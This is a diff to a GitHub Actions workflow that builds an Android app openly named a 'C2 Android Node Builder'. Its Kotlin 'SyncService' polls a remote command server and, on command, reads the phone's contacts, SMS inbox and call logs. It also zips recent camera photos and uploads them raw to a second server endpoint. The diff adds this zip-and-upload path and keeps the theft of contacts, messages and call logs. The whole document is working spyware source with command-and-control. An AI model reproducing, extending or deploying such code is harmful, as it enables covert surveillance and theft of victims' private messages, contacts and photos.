@@ -1,11 +1,11 @@
-name: Absolute Black C2 Android Node Builder
+name: Elite Raw Binary C2 Android Node Builder
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Operational C2 APK
+    name: Build Elite Operational C2 APK
     runs-on: ubuntu-latest
 
     steps:
@@ -183,18 +183,20 @@ jobs:
           import kotlinx.coroutines.*
           import java.io.BufferedReader
           import java.io.File
+          import java.io.FileInputStream
+          import java.io.FileOutputStream
           import java.io.InputStreamReader
           import java.io.OutputStreamWriter
           import java.net.HttpURLConnection
           import java.net.URL
-          import java.security.MessageDigest
-          import java.util.Base64
-          import java.util.UUID
+          import java.util.zip.ZipEntry
+          import java.util.zip.ZipOutputStream
 
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
               private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/unified/stream"
+              private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/unified/upload_raw"
 
               override fun onCreate() {
                   super.onCreate()
@@ -259,16 +261,16 @@ jobs:
                                       } else if (responseStr.contains("EXTRACT_CALLS")) {
                                           val callsData = readCallLogs()
                                           sendReportToServer(deviceId, nodeModel, callsData)
+                                      } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
+                                          zipAndUploadCameraFolder(deviceId, nodeModel)
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
-                                          extractAndSendMedia(deviceId, nodeModel, true)
-                                      } else if (responseStr.contains("EXTRACT_VIDEOS")) {
-                                          extractAndSendMedia(deviceId, nodeModel, false)
+                                          extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                       }
                                   }
                               }
                               conn.disconnect()
 
-                              delay(8000L)
+                              delay(10000L)
                           } catch (e: Exception) {
                               delay(5000L)
                           }
@@ -278,7 +280,7 @@ jobs:
               }
 
               private fun readContacts(): String {
-                  val sb = StringBuilder("=== CONTACTS EXTRACTED ===\n")
+                  val sb = StringBuilder("=== CONTACTS EXTRACTED ===\\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -287,17 +289,17 @@ jobs:
                           while (it.moveToNext()) {
                               val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                               val number = if (numIdx != -1) it.getString(numIdx) else ""
-                              sb.append("• $name: $number\n")
+                              sb.append("• $name: $number\\n")
                           }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error: ${e.message}\n")
+                      sb.append("Error: ${e.message}\\n")
                   }
                   return sb.toString()
               }
 
               private fun readSMS(): String {
-                  val sb = StringBuilder("=== SMS EXTRACTED ===\n")
+                  val sb = StringBuilder("=== SMS EXTRACTED ===\\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                       cursor?.use {
@@ -306,17 +308,17 @@ jobs:
                           while (it.moveToNext()) {
                               val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                               val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
-                              sb.append("From: $address\nText: $body\n-------------------\n")
+                              sb.append("From: $address\\nText: $body\\n-------------------\\n")
                           }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error: ${e.message}\n")
+                      sb.append("Error: ${e.message}\\n")
                   }
                   return sb.toString()
               }
 
               private fun readCallLogs(): String {
-                  val sb = StringBuilder("=== CALL LOGS EXTRACTED ===\n")
+                  val sb = StringBuilder("=== CALL LOGS EXTRACTED ===\\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -325,78 +327,118 @@ jobs:
                         while (it.moveToNext()) {
                             val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                             val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
-                            sb.append("Number: $number | Type: $type\n")
+                            sb.append("Number: $number | Type: $type\\n")
                         }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error: ${e.message}\n")
+                      sb.append("Error: ${e.message}\\n")
                   }
                   return sb.toString()
               }
 
-              private fun extractAndSendMedia(nodeId: String, nodeModel: String, isImage: Boolean) {
+              private fun zipAndUploadCameraFolder(nodeId: String, nodeModel: String) {
                   serviceScope.launch {
                       try {
-                          val uri = if (isImage) MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
-                          val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
-                          val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 5")
+                          val zipFile = File(cacheDir, "Camera_Archive_${System.currentTimeMillis()}.zip")
+                          val zipOut = ZipOutputStream(FileOutputStream(zipFile))
                           
+                          val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                          val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                          val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+                          val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
+
+                          var addedCount = 0
                           cursor?.use {
                               val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                               val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              while (it.moveToNext()) {
+                              while (it.moveToNext() && addedCount < 30) {
                                   if (dataIdx != -1 && nameIdx != -1) {
                                       val filePath = it.getString(dataIdx)
                                       val fileName = it.getString(nameIdx)
                                       val file = File(filePath)
                                       if (file.exists() && file.isFile) {
-                                          sendFileChunks(nodeId, nodeModel, file, fileName)
+                                          try {
+                                              zipOut.putNextEntry(ZipEntry("Camera/$fileName"))
+                                              file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                              zipOut.closeEntry()
+                                              addedCount++
+                                          } catch (e: Exception) {
+                                              // Skip
+                                          }
+                                      }
+                                  }
+                              }
+                          }
+                          zipOut.close()
+
+                          if (addedCount > 0 && zipFile.exists()) {
+                              uploadRawFile(nodeId, nodeModel, zipFile)
+                          } else {
+                              sendReportToServer(nodeId, nodeModel, "No camera media found to archive.")
+                          }
+                      } catch (e: Exception) {
+                          sendReportToServer(nodeId, nodeModel, "Error creating camera ZIP: ${e.message}")
+                      }
+                  }
+              }
+
+              private fun extractAndUploadSingleFiles(nodeId: String, nodeModel: String, isImage: Boolean) {
+                  serviceScope.launch {
+                      try {
+                          val uri = if (isImage) MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+                          val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                          val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+                          val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
+                          
+                          cursor?.use {
+                              val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                              val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                              if (it.moveToNext()) {
+                                  if (dataIdx != -1 && nameIdx != -1) {
+                                      val filePath = it.getString(dataIdx)
+                                      val fileName = it.getString(nameIdx)
+                                      val file = File(filePath)
+                                      if (file.exists() && file.isFile) {
+                                          uploadRawFile(nodeId, nodeModel, file)
                                       }
                                   }
                               }
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "Error extracting media: ${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "Error extracting single file: ${e.message}")
                       }
                   }
               }
 
-              private suspend fun sendFileChunks(nodeId: String, nodeModel: String, file: File, fileName: String) {
+              private fun uploadRawFile(nodeId: String, nodeModel: String, file: File) {
                   try {
-                      val uploadId = UUID.randomUUID().toString()
-                      val fileBytes = file.readBytes()
-                      val fileHash = MessageDigest.getInstance("SHA-256").digest(fileBytes).joinToString("") { "%02x".format(it) }
-                      
-                      val chunkSize = 256 * 1024
-                      val totalChunks = (fileBytes.size + chunkSize - 1) / chunkSize
+                      val url = URL(C2_UPLOAD_URL)
+                      val conn = url.openConnection() as HttpURLConnection
+                      conn.requestMethod = "POST"
+                      conn.setRequestProperty("X-Node-ID", nodeId)
+                      conn.setRequestProperty("X-Node-Model", nodeModel)
+                      conn.setRequestProperty("X-File-Name", file.name)
+                      conn.setRequestProperty("Content-Type", "application/octet-stream")
+                      conn.doOutput = true
+                      conn.setChunkedStreamingMode(0)
+                      conn.connectTimeout = 30000
+                      conn.readTimeout = 30000
 
-                      for (i in 0 until totalChunks) {
-                          val start = i * chunkSize
-                          val end = minOf(start + chunkSize, fileBytes.size)
-                          val chunkBytes = fileBytes.copyOfRange(start, end)
-                          val encodedChunk = Base64.getEncoder().encodeToString(chunkBytes)
-                          
-                          val isLast = (i == totalChunks - 1)
-                          val jsonPacket = "{\"type\":\"MEDIA_CHUNK\",\"uploadId\":\"$uploadId\",\"fileName\":\"$fileName\",\"chunkIndex\":$i,\"totalChunks\":$totalChunks,\"isLast\":$isLast,\"fileHash\":\"$fileHash\",\"data\":\"$encodedChunk\"}"
-                          
-                          val url = URL(C2_STREAM_URL)
-                          val conn = url.openConnection() as HttpURLConnection
-                          conn.requestMethod = "POST"
-                          conn.setRequestProperty("X-Node-ID", nodeId)
-                          conn.setRequestProperty("X-Node-Model", nodeModel)
-                          conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
-                          conn.doOutput = true
-
-                          OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
-                              os.write(jsonPacket)
+                      FileInputStream(file).use { fis ->
+                          conn.outputStream.use { os ->
+                              fis.copyTo(os)
                               os.flush()
                           }
-                          conn.responseCode
-                          conn.disconnect()
-                          delay(100L)
+                      }
+
+                      val responseCode = conn.responseCode
+                      conn.disconnect()
+
+                      if (responseCode != 200) {
+                          sendReportToServer(nodeId, nodeModel, "Raw upload failed with code: $responseCode")
                       }
                   } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "Error sending file $fileName: ${e.message}")
+                      sendReportToServer(nodeId, nodeModel, "Error uploading raw file ${file.name}: ${e.message}")
                   }
               }
 
@@ -426,6 +468,8 @@ jobs:
 
               override fun onDestroy() {
                   super.onDestroy()
+                  wakeLock?.release()
+                  serviceScope.cancel()
               }
 
               override fun onBind(intent: Intent?): IBinder? = null
